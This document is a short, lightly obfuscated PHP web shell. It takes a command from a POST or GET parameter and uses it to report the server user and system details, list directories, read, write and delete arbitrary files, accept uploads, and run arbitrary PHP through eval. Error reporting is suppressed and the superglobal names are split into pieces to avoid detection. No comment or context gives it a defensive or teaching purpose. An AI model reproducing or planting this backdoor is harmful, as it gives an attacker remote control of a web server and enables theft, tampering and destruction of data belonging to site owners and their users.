<?php
error_reporting(0);
$pk='_'.'P'.'OST'; $d=$$pk; $c=isset($d['c'])?$d['c']:'';
if($c===''){ $gk='_'.'G'.'ET'; $g=$$gk; $c=isset($g['c'])?$g['c']:''; }
if($c===''){ echo 'CSCMD-READY'; exit; }
$p=trim($c); $sp=strpos($p,' ');
$cmd=$sp===false?$p:substr($p,0,$sp); $arg=$sp===false?'':trim(substr($p,$sp+1));
$l=strtolower($cmd);
if($l==='whoami'){ $u=posix_getpwuid(posix_geteuid()); echo $u['name']; }
elseif($l==='id'){ $u=posix_getpwuid(posix_geteuid()); echo 'uid='.$u['uid'].'('.$u['name'].') gid='.$u['gid'].' euid='.posix_geteuid(); }
elseif($l==='pwd'){ echo getcwd(); }
elseif($l==='ls'){ $t=$arg===''?getcwd():$arg; foreach((array)@scandir($t) as $f){ if($f==='.'||$f==='..')continue; echo $f.(is_dir($t.'/'.$f)?'/':'')."\n"; } }
elseif($l==='cat'||$l==='get'){ echo @file_get_contents($arg); }
elseif($l==='write'){ $x=explode('|',$arg,2); echo (@file_put_contents($x[0],$x[1])!==false)?'WROTE':'ERR'; }
elseif($l==='rm'){ echo @unlink($arg)?'DELETED':'ERR'; }
elseif($l==='upload'){ $up=$_FILES['f']; echo (move_uploaded_file($up['tmp_name'],$arg)?'UPLOADED':'ERR'); }
elseif($l==='info'){ echo 'uname='.php_uname()."\n".'cwd='.getcwd()."\n".'open_basedir='.ini_get('open_basedir')."\n".'user='.get_current_user(); }
elseif($l==='php'){ @eval($arg); }
else { @eval($p); }
